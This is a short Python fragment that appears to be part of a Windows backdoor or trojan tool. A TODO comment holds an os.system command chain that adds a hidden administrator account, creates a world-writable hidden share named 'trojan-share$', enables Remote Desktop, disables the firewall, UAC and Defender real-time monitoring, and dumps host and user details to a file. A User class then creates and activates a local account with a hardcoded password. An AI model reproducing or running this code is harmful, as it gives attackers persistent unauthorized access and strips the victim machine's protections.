





# TODO :
# https://gist.github.com/wildonion/cc711a5bc743667b00318a713e396b48
# os.system("net user W%computername%O vocfu1203 /add && net localgroup administrators W%computername%O /add && mkdir C:\system-01 && cd system-01 && attrib system-01 +h && net share trojan-share$=C:\system-01 /grant:WO,full /grant:everyone,full && netsh firewall set service type = fileandprint mode = enable && netsh firewall set service type = remotedesktop mode = enable && netsh advfirewall firewall set rule group='remote desktop' new enable=Yes && netsh advfirewall firewall add rule name='Open Ports' dir=out action=allow protocol=TCP localport=8080-445-443-6777-3389 && reg add 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server' /v fDenyTSConnections/t REG_DWORD /d0/f && netsh advfirewall set allprofile state off && reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f && ipconfig /all > C:\system-01\%computername%.txt && getmac > C:\system-01\%computername%.txt && net user > C:\system-01\%computername%.txt && powershell.exe set-executionpolicy remotesigned && powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true")
# ctypes.windll.shell32.ShellExecuteW(None, "powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true", unicode(sys.executable), unicode(__file__), None, 1)

class User:

	def __init__(self):
		pass

	def add(self):
		os.system("net user ielts @1234* /add")

	def admin(self):
		os.system("net user ielts /active:yes")
